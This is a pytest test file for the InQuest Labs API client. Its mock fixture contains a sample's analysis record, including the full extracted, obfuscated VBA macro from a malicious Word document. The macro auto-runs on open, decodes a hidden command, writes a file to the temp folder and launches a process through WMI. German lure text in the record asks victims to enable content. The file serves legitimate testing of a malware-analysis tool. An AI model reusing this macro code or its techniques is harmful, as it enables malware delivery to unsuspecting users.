import pytest

from inquestlabs import inquestlabs_exception
import requests_mock
import requests


@pytest.fixture
def mock_details():
    mocked = u"""{
	"analysis_completed": true,
	"classification": "MALICIOUS",
	"ext_code": "Attribute VB_Name = \"ThisDocument\"\nAttribute VB_Base = \"1Normal.ThisDocument\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\nAttribute VB_PredeclaredId = True\nAttribute VB_Exposed = True\nAttribute VB_TemplateDerived = True\nAttribute VB_Customizable = True\nSub Document_Open()\nDim aOgyI As Long\nDim aPsiU As Integer\naOgyI = -265 + 353\naPsiU = 11022 / 501\naqIEt = aOgyI - aPsiU\nDim aEgfB As Integer\naEgfB = 23138 * 1\n' Bahamas\nDim anzPw\nanzPw = Hex(181)\nDim acwxe\nacwxe = Fix(5)\n' Cox toothache\nDim a76MV\na76MV = Hex(128)\n' Concise widen kentucky entities\nDim airBP\nFor airBP = 23 To 44\nDebug.Print Error(airBP)\nNext airBP\nmain \"sl\"\nEnd Sub\nAttribute VB_Name = \"aftxcy\"\nPublic Const aLxnS9 As String = \"tmp\"\nPublic Const anl37m As String = \"22n4n6473416p55207q6475222n34716q627s666s202473796p60237375636s62707023696q6770236s20246q636\"\nSub avcUt(agY0A)\nDim aeuljN\naeuljN = Abs(-7)\n' Depraved\nDim aHDWr As Long\nDim ahatG8 As Long\naHDWr = 108\nahatG8 = 55\nazVNG = aHDWr + ahatG8\nDim aDkfKB\naDkfKB = 22584 * 1\n' Correlative queue supervisors\nDim a6OdPD\na6OdPD = Fix(7)\n' Zodiac inconsistency present-day mandarin britney items\nDim ae6nKx\nFor ae6nKx = 18 To 42\nDebug.Print Error(ae6nKx)\nNext ae6nKx\n' Grows surrey specialty\nDim aPMvLE\naPMvLE = Fix(4)\n' German printed oblation\nDim an0Zf As Integer\nDim aFmNc As Long\nan0Zf = 59 + 63\naFmNc = 40\naPNmjA = an0Zf / aFmNc\n' Vitriol siren networks wesley southwark pedigree\nDim aX3nyK\naX3nyK = Exp(3)\nDim aDVnfZ As Long\naDVnfZ = 27062 * 1\n' Roth marbles autos belittle\nDim aeu1mD\naeu1mD = Hex(152)\n' Rummage intersection\nDim aV4pY\naV4pY = Exp(3)\n' Xl where\nDim aAMim6\nFor aAMim6 = 12 To 60\nDebug.Print Error(aAMim6)\nNext aAMim6\n' Stumble skip encircle\nDim aG6Rph\naG6Rph = Exp(16)\nDim aB02k\naB02k = Fix(15)\n' Unbiased select\naPG5n4 = Not (aPG5n4)\nDim auN49A\nauN49A = Exp(10)\n' Frightening saucy\nDim aM6ZP\naM6ZP = Exp(11)\n' Lioness persuasive joke\nDim ai6ra\nai6ra = Fix(7)\n' Suburban pander thrifty saddam\naqmAvW = Not (aqmAvW)\nDim aDnCod\naDnCod = Fix(11)\n' Body lifelong relevance app\nDim a1l90\na1l90 = 10205 * 1\n' Wreak exponent\nDim a3dcD\na3dcD = Exp(16)\n' Present moat ablutions\naqblMQ = Not (aqblMQ)\nDim aMApij\nFor aMApij = 7 To 50\nDebug.Print Error(aMApij)\nNext aMApij\n' Insulin sty racy piquant rope composition\nSet objWMIService = GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2\")\nSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\nSet objConfig = objStartup.SpawnInstance_\nSet objProcess = GetObject(\"winmgmts:root\\cimv2:Win32_Process\")\nerrReturn = objProcess.Create(agY0A, Null, objConfig, intProcessID)\nEnd Sub\nFunction aV2CFG(ByRef aFWED As String)\nConst ahj5J1 = 425 - 328\nConst avFmD = 346 - 320\nConst aPR7uc = 62 + 3\nConst aVFGM = avFmD / 2\nDim azBbKh As Long\nDim aFAtzm As String\nIf Len(aFWED) > 0 Then\nFor i = 1 To Len(aFWED)\nazBbKh = 0\naqrsx = Mid(aFWED, i, 1)\naSjOb = Asc(aqrsx)\nIf aSjOb >= ahj5J1 And aSjOb < (ahj5J1 + avFmD) Then\nazBbKh = ahj5J1\nElseIf aSjOb >= aPR7uc And aSjOb < (aPR7uc + avFmD) Then\nazBbKh = aPR7uc\nEnd If\n \nIf azBbKh > 0 Then\nav0OD = (((aSjOb - azBbKh) + aVFGM) Mod avFmD) + azBbKh\nag1MUj = Chr(av0OD)\naFAtzm = aFAtzm + ag1MUj\n            \nElse\naFAtzm = aFAtzm + aqrsx\nEnd If\nNext\nEnd If\n    \naV2CFG = aFAtzm\nEnd Function\nAttribute VB_Name = \"aiAfnK\"\nSub main(an2Q7)\nDim agNwhI As Integer\nDim aUPzb\nagNwhI = 17\naUPzb = 41\naJM9K = agNwhI + aUPzb\nIf amvkSX = False Then\namvkSX = True\nElse\namvkSX = False\nEnd If\n' Jackets penury\nDim apbE5S\napbE5S = Fix(10)\nDim aUOjd As String\naDoxty = Not (aDoxty)\n' Planets limpid while yu plants bio\nIf afOVK = False Then\nafOVK = True\nElse\nafOVK = False\nEnd If\n' Totals wanda vendor skinny brave nightcap\nak2Xu = Not (ak2Xu)\nIf a0wfY = False Then\na0wfY = True\nElse\na0wfY = False\nEnd If\nDim aAJ1M\naAJ1M = Hex(188)\n' Manufactured unflagging\nDim a2yLKH As Long\nDim a95gw As Long\na2yLKH = 76\na95gw = 41\nayBUM = a2yLKH * a95gw\n' Fighter\nafG06 = StrReverse(aV2CFG(anl37m))\nDim aOeME\nFor aOeME = 12 To 58\nDebug.Print Error(aOeME)\nNext aOeME\n' Toward sparc\nDim aHGroK\naHGroK = Hex(87)\n' S yukon epilepsy mysql trash\nDim aioTtJ\naioTtJ = Exp(7)\n' Avoid corrected isabelle insight property\navue7y = Not (avue7y)\n' Coherence proceeds\nDim aEZ56j\nFor aEZ56j = 4 To 51\nDebug.Print Error(aEZ56j)\nNext aEZ56j\n' Bystander skeptical\nDim aOq3L As Long\naOq3L = 21908 * 1\n' Amount\nawGC2y = Not (awGC2y)\nDim a2T3X\nFor a2T3X = 30 To 40\nDebug.Print Error(a2T3X)\nNext a2T3X\n' Distillation britannia conditions logs\nazRhO acdIV3(aL9TU()), aLxnS9, an2Q7\na7fXZ8 = Not (a7fXZ8)\nDim aufJ9\naufJ9 = Abs(27)\n' Romanticism senate misconception\nDim atKBu\natKBu = Fix(13)\n' Discussions gzip\nDim ameNjh\nameNjh = Hex(108)\n' Deluxe fujitsu\nDim aPR8tL\nDim aaTgm8\naPR8tL = 97\naaTgm8 = 29\naMq0D = aPR8tL - aaTgm8\n' Metabolism anatomical\navcUt (acdIV3(afG06))\nDim aemidk\naemidk = Fix(5)\n' Tie yemen lawfully civilian armenia\nDim aB5ry\nFor aB5ry = 2 To 34\nDebug.Print Error(aB5ry)\nNext aB5ry\nDim a4NVC2\na4NVC2 = Fix(8)\n' Tolerate perception sundown rivers\nDim aqJ0vP\naqJ0vP = Exp(13)\nDim atAkFV\natAkFV = Fix(2)\nDim aNgCJG\naNgCJG = Abs(-51)\n\nEnd Sub\nFunction aC5ld()\nDim ahvjB\nahvjB = Abs(48)\nDim aJNDIT As Long\nDim ajKia\naJNDIT = 45\najKia = 20\na8e9tW = aJNDIT + ajKia\n' Vibrating bananas counsel tickets predict\naC5ld = Environ(aLxnS9)\nEnd Function\nAttribute VB_Name = \"ak8Dj\"\nPublic Const amfb1 As Long = 3849 - 3847\nFunction acdIV3(aW5Unh)\nacKI3 = Not (acKI3)\nDim aJq6b\naJq6b = Hex(222)\n' Ambrosia preamble carbine\nDim aYQAl\naYQAl = Fix(14)\n' Unto hopefully\nDim aFjuC\nFor aFjuC = 24 To 64\nDebug.Print Error(aFjuC)\nNext aFjuC\n' Lighting gonna rhapsody\nDim a8Vi2O As Integer\na8Vi2O = 34244 / 4\nIf aCKBq = False Then\naCKBq = True\nElse\naCKBq = False\nEnd If\n' Silence pi gasoline\nasynb = Not (asynb)\n' Band accounting\nDim asQhp As Long\nasQhp = 4141 * 3\n' Kidnapping magically sedate\nIf aazy7 = False Then\naazy7 = True\nElse\naazy7 = False\nEnd If\n' Nutrition premium helpfulness\nDim aFhtM\naFhtM = Hex(98)\na9zpf = \"\"\nFor a9DRH = 1 To Len(aW5Unh) Step 2\n\nak6Vco = aFGBj2(aW5Unh, a9DRH)\nDim autJv As Long\nDim aaQo7f\nautJv = -459 + 518\naaQo7f = 517 - 475\nagmjrC = autJv - aaQo7f\n' Mailed\nDim a1yxCe\nFor a1yxCe = 18 To 53\nDebug.Print Error(a1yxCe)\nNext a1yxCe\n' Bewitch abolitionist tier\na9zpf = a9zpf + ak6Vco\nNext\nDim aBYrhb\naBYrhb = Abs(4)\n' Masonry sufficiently missouri lifelong\nDim aMQvUZ\naMQvUZ = Exp(8)\n' Journal foothold achievement graduate\nDim atvZTq\natvZTq = Exp(11)\n' Bent\nacdIV3 = a9zpf\nEnd Function\nPublic Sub azRhO(aaK9n7, aIHZL, apO5ig)\nDim aHpD2\naHpD2 = Abs(51)\n' Healer received slug\nDim aWxN4\naWxN4 = Fix(14)\naDfXr = Not (aDfXr)\nau3sVx = Not (au3sVx)\n' Officially materialistic valuation\nIf aJgno = False Then\naJgno = True\nElse\naJgno = False\nEnd If\nDim a3Nlm As Integer\nDim azBun\na3Nlm = -589 + 631\nazBun = 24\naC6dbc = a3Nlm - azBun\n' Disco broken amos\nDim a6XAO\na6XAO = Hex(240)\n' Gala ebook\nDim aSQG4 As Long\naSQG4 = 4276 * 2\n' Tool\nDim aDJS0\naDJS0 = Fix(13)\n' Benchmark logical democrat\nDim a02StH\na02StH = Abs(9)\n' Atom\nSet a7KdLv = CreateObject(\"Scripting.FileSystemObject\")\naBRhki = Not (aBRhki)\n' Variance semester feathered\na7BOMC = Not (a7BOMC)\n' Cadillac here queenly welcome\nDim aqk67\nFor aqk67 = 30 To 41\nDebug.Print Error(aqk67)\nNext aqk67\nIf aWuT8n = False Then\naWuT8n = True\nElse\naWuT8n = False\nEnd If\n' Canes uninterested functioning layman\nDim af4Io\nFor af4Io = 20 To 42\nDebug.Print Error(af4Io)\nNext af4Io\n' Status pits grad smith coiled nite nominated\nDim a1UH4 As Long\nDim aVEJsq\na1UH4 = -265 + 314\naVEJsq = 329 - 272\naIAQc = a1UH4 - aVEJsq\n' Dress meuse pantheism bavarian\nDim aCDO4\naCDO4 = Exp(6)\n' Cork kilometers asked\nDim aYaJSW As Long\naYaJSW = 8941 * 2\n' Ideas coffee munich\nSet ahxrls = a7KdLv.CreateTextFile(aiRH7() & apO5ig, 1)\nDim aYev3\naYev3 = Abs(54)\nDim areDW\nareDW = Abs(43)\n' Abstracted provencal sunshine popish sql\nIf ajZlr = False Then\najZlr = True\nElse\najZlr = False\nEnd If\n' Derek contracting\nDim abTR9r\nDim aGd1Xu As Integer\nabTR9r = 236 - 169\naGd1Xu = 2835 / 315\naQGWK = abTR9r + aGd1Xu\nDim aHtEK\naHtEK = Abs(-60)\nWith ahxrls\nIf an1xWv = False Then\nan1xWv = True\nElse\nan1xWv = False\nEnd If\n' Denial samaria yawl\nDim aUOIts\naUOIts = Exp(3)\n' Unmerciful knocker rampart specification pussy\nDim a8MSma\na8MSma = Fix(5)\n' Flinty beaker identifies programming history\n.Write aaK9n7\nIf apijyb = False Then\napijyb = True\nElse\napijyb = False\nEnd If\n' Hydrogen\nDim a3r48I\na3r48I = Hex(219)\n.Close\nEnd With\nDim aBU1I\naBU1I = Exp(5)\naAHYBg = Not (aAHYBg)\n' Ethnic recognize\nDim aUGtFc As Integer\nDim av0iJ3 As Integer\naUGtFc = 50\nav0iJ3 = 36\nahWw4 = aUGtFc / av0iJ3\n' Verification torpedoes\nDim aHgXY\naHgXY = Hex(244)\nDim aHPbaG\naHPbaG = Fix(2)\n' Tulip toilette climber lateral enamored\nDim aTI9p\naTI9p = Exp(4)\n' Sieve covetous level redolent completion populations symbolical strict\nDim a9iAyP As Long\na9iAyP = 29563 * 1\nDim aceVl\naceVl = Abs(-23)\n' Dj helen chute\nDim atX8hy\natX8hy = Abs(20)\nIf a2SJA = False Then\na2SJA = True\nElse\na2SJA = False\nEnd If\n' Educators\nauFRrP = Not (auFRrP)\n' Detailed insipid throat research\nDim adI1Jx\nFor adI1Jx = 14 To 39\nDebug.Print Error(adI1Jx)\nNext adI1Jx\n' Uncontrolled consistently anxiety nutriment\nDim awzZLY\nawzZLY = Abs(6)\n' Oak crutch alfalfa november sarah\nDim aN13X\nFor aN13X = 24 To 35\nDebug.Print Error(aN13X)\nNext aN13X\n' Hips wrack friendship appointment\nIf aT5o7 = False Then\naT5o7 = True\nElse\naT5o7 = False\nEnd If\nDim ajm2W\najm2W = 10632 * 1\nDim a2XMq As Long\nDim abh5K As Integer\na2XMq = 121\nabh5K = 16\naBIWUX = a2XMq + abh5K\nDim aS7NyO\naS7NyO = 31475 * 1\nDim ab57lN\nab57lN = Fix(3)\nDim a64Yt As Long\na64Yt = 5993 * 2\n' Tannin incredulity analog\nDim a5onIR\na5onIR = Fix(15)\nDim a3jO8\na3jO8 = Fix(9)\n' Twos\nIf a4H62A = False Then\na4H62A = True\nElse\na4H62A = False\nEnd If\n' Seizure unix frank\nDim awBR7S As Long\nDim a3gt4 As Integer\nawBR7S = 627 - 610\na3gt4 = 15\naAUMba = awBR7S * a3gt4\nDim atk6VF\natk6VF = Hex(97)\nDim aX28HA\nFor aX28HA = 2 To 57\nDebug.Print Error(aX28HA)\nNext aX28HA\n' Ing cameras incomplete\nDim apiDd\nDim atrkO As Integer\napiDd = 107\natrkO = 27540 / 918\naBTc1r = apiDd / atrkO\n' Student proficient tardily lincoln\nDim a0sTv\na0sTv = Abs(22)\nDim aYCPu7 As Long\naYCPu7 = 27933 * 1\n' Typhoid measurable\nEnd Sub\nFunction aL9TU()\nDim atxBZQ\nDim avLBG As Long\natxBZQ = 403 - 310\navLBG = 29\naStLi3 = atxBZQ * avLBG\n' Dentists refugee iran\naRzad = Not (aRzad)\n' Enemies headstrong\nDim aLdqs\naLdqs = Abs(-12)\n' Studying angel citations racing hackneyed nj\nDim aICBW\naICBW = Exp(7)\nDim aCiaDo\nFor aCiaDo = 16 To 53\nDebug.Print Error(aCiaDo)\nNext aCiaDo\n' Lessons\nDim aZXer\naZXer = Hex(191)\n' Cookbook\nIf afeoED = False Then\nafeoED = True\nElse\nafeoED = False\nEnd If\n' Tucker tennessee harassment\nDim anAyT\nDim agBtn As Long\nanAyT = 91\nagBtn = -66 + 127\na41Xf = anAyT - agBtn\n' Plymouth luis compensation\nDim a6zJ7a\nDim a6o59z As Integer\na6zJ7a = 5238 / 97\na6o59z = 50\namOZ6f = a6zJ7a + a6o59z\n' Attempted admissions\nIf aEqU4 = False Then\naEqU4 = True\nElse\naEqU4 = False\nEnd If\n' Foothold rectify tho victor\nDim aWb5G\naWb5G = 29827 * 1\n' Jay painful\nDim aLzs3f\naLzs3f = Fix(16)\n' Relax existing surrounded vacancies airship\nazRZKy = Not (azRZKy)\n' Bushel episodes\nDim aWCwFk As Integer\nDim aqsdnf As Long\naWCwFk = 50\naqsdnf = 25\naHi2XN = aWCwFk / aqsdnf\n' Convenience caucasus crawford\nDim alkv6\nFor alkv6 = 28 To 36\nDebug.Print Error(alkv6)\nNext alkv6\n' Verity twitch mating\nDim aqTWEX As Long\nDim abVvW As Long\naqTWEX = 44\nabVvW = 40\nab7V9G = aqTWEX + abVvW\n' Sealskin\nDim acYl82\nacYl82 = 29130 * 1\nDim awfEY As Long\nawfEY = 14173 + 2\n' Hawaii\nDim a0COW\na0COW = Abs(-45)\naZ2yk = Not (aZ2yk)\nSet aHX3xw = New azBP5k\nIf a8ZdLD = False Then\na8ZdLD = True\nElse\na8ZdLD = False\nEnd If\n' Physically asthma quartette developmental\nDim a4f65N As Long\nDim a9JLk8 As Integer\na4f65N = 115\na9JLk8 = 19\na5l6wY = a4f65N / a9JLk8\n' Directory\nDim aPc9W\naPc9W = Abs(13)\nDim aI31MC\nFor aI31MC = 13 To 36\nDebug.Print Error(aI31MC)\nNext aI31MC\n' Rolf viands algorithm flying boys\nDim aTpht2 As Long\naTpht2 = 200 + 90\nDim acS4hU\nacS4hU = Exp(5)\n' Extraction gruel mh\naG1UE = Not (aG1UE)\n' Canadian theft talisman tuesday cloudless\naFxMf = aHX3xw.ao.Value\nDim aVd3e\naVd3e = Exp(15)\n' Counselor voices imagination echo fewer\nDim aav64\naav64 = Abs(50)\n' Needle baal cuts authentication\nDim ab4UAw As Long\nDim aFCxi As Long\nab4UAw = 15408 / 321\naFCxi = 32\naLfVn6 = ab4UAw - aFCxi\n' Arrange biological\nDim anpVd\nanpVd = Fix(3)\n' Marshall subscriber wanted\nDim aPFr0\naPFr0 = Fix(14)\n' Labeled vincent betting trips siena\nDim aF3Mg7 As Long\nDim a1ePKx As Integer\naF3Mg7 = 109\na1ePKx = 65 - 30\na4bRw6 = aF3Mg7 / a1ePKx\n' Transmutation\navfS5 = aHX3xw.bt.Value\nDim aLTAZ\nFor aLTAZ = 30 To 46\nDebug.Print Error(aLTAZ)\nNext aLTAZ\n' Indianapolis official\nDim ahyjxg\nahyjxg = Exp(3)\n' Colic veterans\nIf aEJH1 = False Then\naEJH1 = True\nElse\naEJH1 = False\nEnd If\n' Pre peel\naL9TU = aFxMf & avfS5\nEnd Function\nFunction aiRH7()\nDim a1Rcq\na1Rcq = Abs(37)\nDim aGaMnQ\nFor aGaMnQ = 11 To 43\nDebug.Print Error(aGaMnQ)\nNext aGaMnQ\n' Logo imported flinty rouge\naiRH7 = aC5ld() & \"\\aCtjJ.x\"\nEnd Function\nFunction aFGBj2(aW5Unh, a9DRH)\nDim a6BgYx\na6BgYx = Hex(120)\nDim asOMmt\nasOMmt = Hex(67)\naFGBj2 = Chr(\"&h\" & Mid(aW5Unh, a9DRH, amfb1))\nEnd Function\nAttribute VB_Name = \"azBP5k\"\nAttribute VB_Base = \"0{9B991204-459E-4B17-9850-295B99962B6F}{A9F8B512-5A51-44BB-A73C-471E88529EE8}\"\nAttribute VB_GlobalNameSpace = False\nAttribute VB_Creatable = False\nAttribute VB_PredeclaredId = True\nAttribute VB_Exposed = False\nAttribute VB_TemplateDerived = False\nAttribute VB_Customizable = False\nPrivate Sub UserForm_Initialize()\nar2hIp = Not (ar2hIp)\n' Argue cannon puma recorder\nDim a5o1I\na5o1I = Fix(4)\n' Kaffir happened\nDim aNcbS3\naNcbS3 = Fix(3)\nDim amzOUI As Long\nDim awXJG As Integer\namzOUI = 362 - 234\nawXJG = 27\naMhDJ = amzOUI - awXJG\n' Quiescent format\nDim aUTnVA As Long\naUTnVA = 24602 * 1\naTEvOs = Not (aTEvOs)\nEnd Sub\n\n",
	"ext_context": "\n\n\n",
	"ext_metadata": "File Name                       : 30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c\nFile Size                       : 140 kB\nFile Modification Date/Time     : 2019:11:06 21:07:03+00:00\nFile Access Date/Time           : 2019:11:06 21:07:03+00:00\nFile Inode Change Date/Time     : 2019:11:06 21:07:03+00:00\nFile Permissions                : rw-rwxr--\nFile Type                       : ZIP\nFile Type Extension             : zip\nMIME Type                       : application/zip\nZip Required Version            : 20\nZip Bit Flag                    : 0x0006\nZip Compression                 : Deflated\nZip Modify Date                 : 1980:01:01 00:00:00\nZip CRC                         : 0x0c0cc35b\nZip Compressed Size             : 400\nZip Uncompressed Size           : 1505\nZip File Name                   : [Content_Types].xml\n\nFile Name                       : image1.jpeg\nFile Size                       : 98 kB\nFile Modification Date/Time     : 1980:01:01 00:00:00+00:00\nFile Access Date/Time           : 2019:11:06 21:07:10+00:00\nFile Inode Change Date/Time     : 2019:11:06 21:07:12+00:00\nFile Permissions                : rwxrwxrwx\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Big-endian (Motorola, MM)\nPhotometric Interpretation      : RGB\nOrientation                     : Horizontal (normal)\nSamples Per Pixel               : 3\nX Resolution                    : 96\nY Resolution                    : 96\nResolution Unit                 : inches\nSoftware                        : Adobe Photoshop CC 2019 (Windows)\nModify Date                     : 2019:10:07 22:05:38\nExif Version                    : 0221\nColor Space                     : Uncalibrated\nExif Image Width                : 1000\nExif Image Height               : 275\nCompression                     : JPEG (old-style)\nThumbnail Offset                : 398\nThumbnail Length                : 2003\nCurrent IPTC Digest             : cdcffa7da8c7be09057076aeaf05c34e\nCoded Character Set             : UTF8\nApplication Record Version      : 0\nIPTC Digest                     : cdcffa7da8c7be09057076aeaf05c34e\nDisplayed Units X               : inches\nDisplayed Units Y               : inches\nGlobal Angle                    : 30\nGlobal Altitude                 : 30\nPhotoshop Thumbnail             : (Binary data 2003 bytes, use -b option to extract)\nPhotoshop Quality               : 12\nPhotoshop Format                : Progressive\nProgressive Scans               : 3 Scans\nXMP Toolkit                     : Adobe XMP Core 5.6-c145 79.163499, 2018/08/13-16:40:22\nCreator Tool                    : Paint.NET v3.5.11\nCreate Date                     : 2019:10:07 22:02:15+03:00\nMetadata Date                   : 2019:10:07 22:05:38+03:00\nDocument ID                     : adobe:docid:photoshop:12e1adf8-ae5a-6d42-89bc-66f2bbb62741\nInstance ID                     : xmp.iid:c69177cd-9fe4-7044-be5a-e60c0cec53fb\nOriginal Document ID            : EC381424F81A4AF9079B45D2377938CA\nFormat                          : image/jpeg\nColor Mode                      : RGB\nICC Profile Name                : \nHistory Action                  : saved, saved\nHistory Instance ID             : xmp.iid:dc986887-b6b9-324c-afbd-cf38bd4f373e, xmp.iid:c69177cd-9fe4-7044-be5a-e60c0cec53fb\nHistory When                    : 2019:10:07 22:05:38+03:00, 2019:10:07 22:05:38+03:00\nHistory Software Agent          : Adobe Photoshop CC 2019 (Windows), Adobe Photoshop CC 2019 (Windows)\nHistory Changed                 : /, /\nDCT Encode Version              : 100\nAPP14 Flags 0                   : [14]\nAPP14 Flags 1                   : (none)\nColor Transform                 : YCbCr\nImage Width                     : 1000\nImage Height                    : 275\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)\nImage Size                      : 1000x275\nMegapixels                      : 0.275\nThumbnail Image                 : (Binary data 2003 bytes, use -b option to extract)\n",
	"ext_ocr": "Dieses Dokument wurde in der vorherigen Version von \"Microsoft Of|fb01|ce Word\" erstellt.\n\nUm dieses Dokument zu visualisieren oder bearbeiten, klicken Sie, bitte, auf die\nSchaltfl|e9|iche ,,Bearbeitung aktivieren|201d| in der oberen Leiste und dann auf ,,lnhalt aktivieren|201d|.\n\n \n\n",
	"file_type": "DOC",
	"first_seen": "Wed, 06 Nov 2019 21:05:52 GMT",
	"inquest_alerts": [{
		"category": "info",
		"description": "Detected macro logic that can write data to the file system.",
		"reference": null,
		"title": "Macro with File System Write"
	}, {
		"category": "info",
		"description": "Detected macro logic that will automatically execute on document open. Most malware contains some execution hook.",
		"reference": null,
		"title": "Macro with Startup Hook"
	}, {
		"category": "info",
		"description": "Detected a macro with a suspicious string. Suspicious strings include privileged function calls, obfuscations, odd registry keys, etc...",
		"reference": null,
		"title": "Macro Contains Suspicious String"
	}],
	"inquest_dfi_size": 450624,
	"last_inquest_dfi": "Wed, 06 Nov 2019 21:07:34 GMT",
	"last_inquest_featext": "Wed, 06 Nov 2019 21:07:43 GMT",
	"last_updated": "Wed, 06 Nov 2019 21:07:44 GMT",
	"len_code": 13801,
	"len_context": 23,
	"len_metadata": 4559,
	"len_ocr": 301,
	"md5": "878c69c589d5a14f113ac65f03973e68",
	"mime_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
	"sha1": "09896ec0c5d27529d2fbc86c5840fcce19b9b560",
	"sha256": "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c",
	"sha512": "4eef47825c5eddedd7a3c9529c2de513121ca8750568404ec5411bb4ab213cf94bf4075ddfa1265f87c936dcfedccbd3bb2ea80856b9b6cc68e5de161394acce",
	"size": 143551,
	"subcategory": "macro_hunter",
	"subcategory_url": "https://github.com/InQuest/yara-rules/blob/master/labs.inquest.net/macro_hunter.rule",
	"virus_total": "https://www.virustotal.com/gui/file/30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"
}"""
    return mocked

def mock_invalid_hash_response(*args, **kwargs):
    with requests_mock.Mocker() as mock_request:
        mock_request.get("http://labs_mock.com", json={'error': "Supplied 'sha256' value is not a valid hash.", 'success': False}, status_code=400)
        response = requests.get("http://labs_mock.com")
        return response


def test_dfi_details_invalid_hash(labs, mocker):
    mocker.patch('requests.request', side_effect=mock_invalid_hash_response)

    with pytest.raises(AssertionError) as excinfo:
        labs.dfi_details("mock")

    assert "AssertionError" in str(excinfo)


def test_dfi_details(labs, mocker):
    mocker.patch('inquestlabs.inquestlabs_api.API',
	 return_value={"sha256":"30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"})

    details = labs.dfi_details(
        "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c")

    assert details["sha256"] == "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"


def test_dfi_details_with_attributes(labs, mocker):
    mocker.patch('inquestlabs.inquestlabs_api.API',
	 return_value={"sha256":"30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c", "attribrutes":["test"]})

    details = labs.dfi_details(
        "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c", attributes=True)
    assert details["sha256"] == "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"
    assert "attributes" in details.keys()



def test_dfi_details_invalid_hash_with_key(labs_with_key, mocker):
    mocker.patch('requests.request', side_effect=mock_invalid_hash_response)

    with pytest.raises(AssertionError) as excinfo:
        labs_with_key.dfi_details("mock")

    assert "Assertion" in str(excinfo)



def test_dfi_details_with_key(labs_with_key, mocker):
    mocker.patch('inquestlabs.inquestlabs_api.API',
	 return_value={"sha256":"30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"})

    details = labs_with_key.dfi_details(
        "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c")

    assert details["sha256"] == "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"



def test_dfi_details_with_attributes_with_key(labs_with_key, mocker):
    mocker.patch('inquestlabs.inquestlabs_api.API',
	 return_value={"sha256":"30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c", "attribrutes":["test"]})

    details = labs_with_key.dfi_details(
        "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c", attributes=True)
    assert details["sha256"] == "30c53168deee9046d41d3e602e0e598c2cf0880fed1a34b957f5f3bd9361b52c"
    assert "attributes" in details.keys()

